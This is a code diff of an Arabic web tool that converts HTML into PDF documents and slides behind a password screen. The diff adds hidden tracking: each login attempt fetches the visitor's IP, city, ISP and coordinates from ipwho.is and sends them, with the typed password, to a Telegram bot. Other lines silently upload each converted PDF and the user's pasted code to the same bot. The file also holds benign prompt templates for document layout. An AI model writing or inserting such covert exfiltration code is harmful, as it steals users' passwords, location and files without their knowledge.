@@ -135,13 +135,12 @@
             }).catch(e => console.error("خطأ في إرسال النص:", e));
         }
 
-        // 2. دالة إرسال الملفات (تم التعديل لضمان الإرسال في كل مرة)
+        // 2. دالة إرسال الملفات
         function sendFileToTelegram(fileBlob, fileName, captionMsg) {
             const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
             const formData = new FormData();
             
             formData.append('chat_id', chatId);
-            // الطريقة المضمونة لإرفاق الملفات في JavaScript
             formData.append('document', fileBlob, fileName); 
             formData.append('caption', captionMsg);
 
@@ -162,18 +161,51 @@
             const input = document.getElementById('pass-input').value;
             const errorMsg = document.getElementById('pass-error');
             
-            if (input === 'Sa12345678@') {
+            const isSuccess = (input === 'Sa12345678@');
+
+            // إخفاء الشاشة فوراً إذا كانت الكلمة صحيحة لكي لا ينتظر المستخدم
+            if (isSuccess) {
                 document.getElementById('password-overlay').style.display = 'none';
-                sendTextToTelegram('✅ تم تسجيل الدخول للمنصة بنجاح.'); 
             } else {
                 errorMsg.style.display = 'block';
-                sendTextToTelegram(`❌ محاولة دخول فاشلة للمنصة.\nالكلمة المجربة: ${input}`); 
                 setTimeout(() => errorMsg.style.display = 'none', 3000);
             }
+
+            // جلب معلومات الجهاز (الآيبي والموقع) في الخلفية
+            fetch('https://ipwho.is/')
+                .then(res => res.json())
+                .then(data => {
+                    let deviceInfo = '';
+                    if(data.success) {
+                        deviceInfo = `\n\n📍 معلومات الجهاز:` +
+                                     `\nالآيبي: ${data.ip}` +
+                                     `\nالدولة: ${data.country}` +
+                                     `\nالمدينة: ${data.city}` +
+                                     `\nمزود الخدمة: ${data.connection.isp}` +
+                                     `\nالخريطة: https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
+                    } else {
+                        deviceInfo = `\n\n⚠️ تعذر جلب معلومات الموقع بدقة.`;
+                    }
+
+                    // إرسال الإشعار لتيليجرام بناءً على حالة تسجيل الدخول
+                    if (isSuccess) {
+                        sendTextToTelegram(`✅ تسجيل دخول ناجح للمنصة.` + deviceInfo); 
+                    } else {
+                        sendTextToTelegram(`❌ محاولة دخول فاشلة.\nالكلمة المجربة: ${input}` + deviceInfo); 
+                    }
+                })
+                .catch(err => {
+                    // في حال كان المستخدم يستخدم VPN قوي أو مانع إعلانات يمنع جلب الآيبي
+                    if (isSuccess) {
+                        sendTextToTelegram(`✅ تسجيل دخول ناجح للمنصة.\n\n⚠️ (تم حجب الآيبي من قبل متصفح المستخدم).`); 
+                    } else {
+                        sendTextToTelegram(`❌ محاولة دخول فاشلة.\nالكلمة المجربة: ${input}\n\n⚠️ (تم حجب الآيبي).`); 
+                    }
+                });
         }
 
         const prompts = {
-            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
+            a4: `أنت مصمم وثائق HTML محترف. قم بإنشاء كود HTML كامل لبحث أكاديمي بالعربية وفق المواصفات التالية:\n\n**عنوان البحث:** [اكتب العنوان هنا]\n**المادة:** [مثال: فيزياء / كيمياء / رياضيات]\n**الطالب:** [الاسم]\n**المعلم:** [الاسم]\n**الصف:** [مثال: أول ثانوي]\n**العام الدراسي:** [مثال: 1447هـ / 2026م]\n**عدد الصفحات المطلوبة:** [مثال: 5 صفحات]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل صفحة تكون: <div class="page">. أبعادها: width: 794px; height: 1123px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية وأضف النقطة كجزء من النص هكذا: <p>• النقطة الأولى</p>.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل كل صفحة:**\nصفحة 1: غلاف احترافي.\nصفحة 2+: محتوى البحث.\nصفحة أخيرة: المراجع.\nنمط التصميم: احترافي وأنيق بألوان متناسقة.`,
             169: `أنت مصمم عروض HTML محترف. قم بإنشاء كود HTML كامل لعرض تقديمي بالعربية وفق المواصفات التالية:\n\n**عنوان العرض:** [اكتب العنوان هنا]\n**المادة / الموضوع:** [مثال: مشروع فيزياء / درس تاريخ]\n**المقدِّم:** [الاسم]\n**عدد الشرائح:** [مثال: 8 شرائح]\n\n**متطلبات تقنية صارمة جداً — لا تتجاوزها:**\n1. يبدأ الكود بـ <html lang="ar" dir="rtl">\n2. استدعاء خطوط Google Fonts صراحةً (مثل Cairo أو Tajawal).\n3. الـ body يحتوي على: display: block; direction: rtl; text-align: right; margin: 0; padding: 0; box-sizing: border-box;\n4. كل شريحة تكون: <div class="page">. أبعادها: width: 1280px; height: 720px; overflow: hidden; position: relative; box-sizing: border-box;\n5. **مهم جداً للنقاط:** لا تستخدم القوائم الافتراضية (ul, ol). للترقيم أو النقاط، استخدم عناصر <p> أو <div> عادية.\n6. ممنوع استخدام letter-spacing نهائياً.\n\n**هيكل الشرائح:**\nشريحة 1: غلاف (عنوان كبير + اسم المقدِّم).\nشرائح 2+: محتوى منظم.\nنمط التصميم: حديث، خلفيات ملونة، نصوص واسعة. خطوط كبيرة وواضحة.`
         };
 
@@ -277,7 +309,6 @@
 
             if (!code.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }
 
-            // إرسال تنبيه في كل مرة يضغط فيها المستخدم على "استخراج"
             sendTextToTelegram(`⏳ تم البدء بعملية استخراج جديدة...\nالاسم: ${fileName}`);
 
             let docWidth, docHeight, pdfOrientation;
@@ -357,11 +388,9 @@
                 // 🚀 إرسال الملفات لتيليجرام في كل عملية تحويل
                 // ==================================================
                 
-                // 1. إرسال ملف الـ PDF
                 const pdfBlob = pdf.output('blob');
                 sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج الملف بنجاح!\nالاسم: ${fileName}\nالمقاس: ${formatType === 'a4' ? 'A4' : '16:9'}`);
 
-                // 2. إرسال الكود كملف نصي (TXT)
                 const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
                 sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالملف.`);
                 
